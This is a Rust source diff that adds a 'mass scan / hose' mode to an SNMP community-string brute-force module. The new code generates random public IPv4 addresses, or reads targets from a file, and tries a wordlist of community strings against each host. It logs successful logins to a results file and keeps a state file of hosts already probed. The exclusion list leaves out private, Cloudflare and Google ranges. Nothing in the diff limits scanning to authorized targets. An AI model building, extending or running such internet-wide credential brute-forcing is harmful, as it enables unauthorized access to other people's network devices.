@@ -1,34 +1,63 @@
-use anyhow::{anyhow, Result};
+use anyhow::{anyhow, Result, Context};
 use colored::*;
 use futures::stream::{FuturesUnordered, StreamExt};
 use std::{
     io::Write,
-    net::{SocketAddr, UdpSocket},
+    net::{SocketAddr, UdpSocket, IpAddr},
     sync::Arc,
+    sync::atomic::{AtomicBool, AtomicUsize, Ordering},
     time::{Duration, Instant},
 };
-use std::sync::atomic::{AtomicBool, Ordering};
 
 use tokio::{
     sync::Mutex,
     sync::Semaphore,
     task::spawn_blocking,
     time::sleep,
+    fs::OpenOptions,
+    io::AsyncWriteExt,
 };
 
 use crate::utils::{
     prompt_yes_no, prompt_existing_file, prompt_int_range,
     load_lines, prompt_default, normalize_target,
 };
-use crate::modules::creds::utils::BruteforceStats;
+use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions};
 
 const PROGRESS_INTERVAL_SECS: u64 = 2;
+const STATE_FILE: &str = "snmp_hose_state.log";
+
+// Hardcoded exclusions (Private + Cloudflare + Google + Link Local etc)
+const EXCLUDED_RANGES: &[&str] = &[
+    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
+    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
+    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
+    // Cloudflare
+    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
+    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
+    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
+    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
+    "1.1.1.1/32", "1.0.0.1/32",
+    // Google
+    "8.8.8.8/32", "8.8.4.4/32"
+];
 
 pub async fn run(target: &str) -> Result<()> {
     println!("\n{}", "=== SNMPv1/v2c Brute Force Module ===".bold().cyan());
     println!("{}", "    Community String Discovery Tool".cyan());
     println!();
     println!("{}", format!("[*] Target: {}", target).cyan());
+
+    // Check for Mass Scan Mode
+    let is_mass_scan = target == "random" || target == "0.0.0.0" 
+        || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();
+
+    if is_mass_scan {
+        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
+        return run_mass_scan(target).await;
+    }
+
+    // --- Standard Single-Target Logic ---
 
     let default_port = 161;
     let port = prompt_int_range("SNMP Port", default_port as i64, 1, 65535).await? as u16;
@@ -529,5 +558,159 @@ fn encode_sub_id(mut value: u32, output: &mut Vec<u8>) {
     output.extend_from_slice(&bytes);
 }
 
+
+
+/// Run mass scan logic (Hose style)
+async fn run_mass_scan(target: &str) -> Result<()> {
+    println!("{}", "[*] Preparing Mass Scan configuration...".blue());
+    
+    let port = prompt_int_range("SNMP Port", 161, 1, 65535).await? as u16;
+    let communities_file = prompt_existing_file("Community string wordlist").await?;
+    
+    let snmp_version = loop {
+        let input = prompt_default("SNMP Version (1 or 2c)", "2c").await?;
+        match input.trim().to_lowercase().as_str() {
+            "1" => break 0,
+            "2c" | "2" => break 1,
+            _ => println!("Invalid version. Enter '1' or '2c'."),
+        }
+    };
+    
+    let communities = load_lines(&communities_file)?;
+    if communities.is_empty() {
+        return Err(anyhow!("Community wordlist cannot be empty"));
+    }
+    
+    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000).await? as usize;
+    let verbose = prompt_yes_no("Verbose mode?", false).await?;
+    let timeout_secs = prompt_int_range("Timeout (seconds)", 3, 1, 300).await? as u64;
+    let output_file = prompt_default("Output result file", "snmp_mass_results.txt").await?;
+    
+    // Parse exclusions
+    let exclusions = Arc::new(parse_exclusions(EXCLUDED_RANGES));
+    
+    // Shared State
+    let semaphore = Arc::new(Semaphore::new(concurrency));
+    let stats_checked = Arc::new(AtomicUsize::new(0));
+    let stats_found = Arc::new(AtomicUsize::new(0));
+    let creds_pkg = Arc::new((communities, snmp_version, timeout_secs));
+    
+    // Stats Reporter
+    let s_checked = stats_checked.clone();
+    let s_found = stats_found.clone();
+    tokio::spawn(async move {
+        loop {
+            tokio::time::sleep(Duration::from_secs(5)).await;
+            println!(
+                "[*] Status: {} IPs scanned, {} SNMP devices found",
+                s_checked.load(Ordering::Relaxed),
+                s_found.load(Ordering::Relaxed).to_string().green().bold()
+            );
+        }
+    });
+    
+    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";
+    
+    if run_random {
+        println!("{}", "[*] Starting Random Internet Scan...".green());
+        loop {
+            let permit = semaphore.clone().acquire_owned().await.unwrap();
+            let exc = exclusions.clone();
+            let cp = creds_pkg.clone();
+            let sc = stats_checked.clone();
+            let sf = stats_found.clone();
+            let of = output_file.clone();
+            
+            tokio::spawn(async move {
+                let ip = generate_random_public_ip(&exc);
+                
+                if !is_ip_checked(&ip, STATE_FILE).await {
+                    mark_ip_checked(&ip, STATE_FILE).await;
+                    mass_scan_host(ip, port, cp, sf, of, verbose).await;
+                }
+                
+                sc.fetch_add(1, Ordering::Relaxed);
+                drop(permit);
+            });
+        }
+    } else {
+        // File mode
+        let content = tokio::fs::read_to_string(target).await.unwrap_or_default();
+        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
+        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());
+        
+        for ip_str in lines {
+            let permit = semaphore.clone().acquire_owned().await.unwrap();
+            let cp = creds_pkg.clone();
+            let sc = stats_checked.clone();
+            let sf = stats_found.clone();
+            let of = output_file.clone();
+            
+            let ip_addr = match ip_str.parse::<IpAddr>() {
+                Ok(ip) => Some(ip),
+                Err(_) => None
+            };
+            
+            tokio::spawn(async move {
+                if let Some(ip) = ip_addr {
+                    if !is_ip_checked(&ip, STATE_FILE).await {
+                        mark_ip_checked(&ip, STATE_FILE).await;
+                        mass_scan_host(ip, port, cp, sf, of, verbose).await;
+                    }
+                }
+                sc.fetch_add(1, Ordering::Relaxed);
+                drop(permit);
+            });
+        }
+        
+        // Wait for finish
+        for _ in 0..concurrency {
+            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
+        }
+    }
+    
+    Ok(())
+}
+
+async fn mass_scan_host(
+    ip: IpAddr,
+    port: u16,
+    creds: Arc<(Vec<String>, u8, u64)>,
+    stats_found: Arc<AtomicUsize>,
+    output_file: String,
+    _verbose: bool,
+) {
+    let addr = format!("{}:{}", ip, port);
+    let (communities, version, timeout_secs) = &*creds;
+    let timeout = Duration::from_secs(*timeout_secs);
+    
+    for community in communities {
+        match try_snmp_community(&addr, community, *version, timeout).await {
+            Ok(true) => {
+                let result_str = format!("{} -> community: '{}'", addr, community);
+                println!("\\r{}", format!("[+] FOUND: {}", result_str).green().bold());
+                
+                if let Ok(mut file) = OpenOptions::new()
+                    .create(true)
+                    .append(true)
+                    .open(&output_file)
+                    .await
+                {
+                    let _ = file.write_all(format!("{}\\n", result_str).as_bytes()).await;
+                }
+                
+                stats_found.fetch_add(1, Ordering::Relaxed);
+                return; // Stop on first valid community for this host
+            }
+            Ok(false) => {
+                // Auth failure
+            }
+            Err(_) => {
+                // Connection error
+                return;
+            }
+        }
+    }
+}
 
 
